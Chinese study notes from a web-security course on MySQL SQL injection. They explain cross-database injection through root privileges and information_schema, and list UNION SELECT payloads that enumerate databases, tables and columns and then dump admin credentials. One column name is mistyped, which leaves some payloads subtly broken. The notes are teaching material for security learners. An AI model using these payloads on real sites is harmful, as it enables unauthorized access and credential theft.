小迪安全 WEB漏洞 SQL注入之MYSQL注入

数据库A=网站=数据库用户A

数据库B=网站=数据库用户B

A当前的注入点只能操作A网站不能操作B网站

数据库A=网站=root用户A

数据库B=网站=root用户B

Aroot用户的高权限可以去访问B 所以A的漏洞可以危害到B

查看 information_schema

记录数据库名的

mysql上所有的表名

查询数据库的名字

跨库注入 就要借助 select * from schemata; 来获取其他数据库

union select 1,schema_name,3 from information_schema.schemata

schema_name, 数据库名

information_schema.schemata 记录数据库名的表

让其全部选择 在schema_name 前加上 group_concat()

union select 1,group_concat(schema_name),3 from information_schema.schemata

就可以爆出所有的数据库名

获取指定 lt 数据库名下的表名信息

union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’lt’

获取指定qqyw下的表名 admin 下的列名信息：

union select 1,group_concat(column_name),3 from information_schema.columns where tables_name=’admin’

因为在查询的时候可能有相同表名 所以需要加上条件 and table_schema=’lt’

union select 1,group_concat(column_name),3 from information_schema.columns where tables_name=’admin’ and table_schema=’lt’

获取qqyw下的admin数据

union select 1,u,p from lt.admin 一定要加点 一定要有指向数据库名

如果不加点的话可能会出错
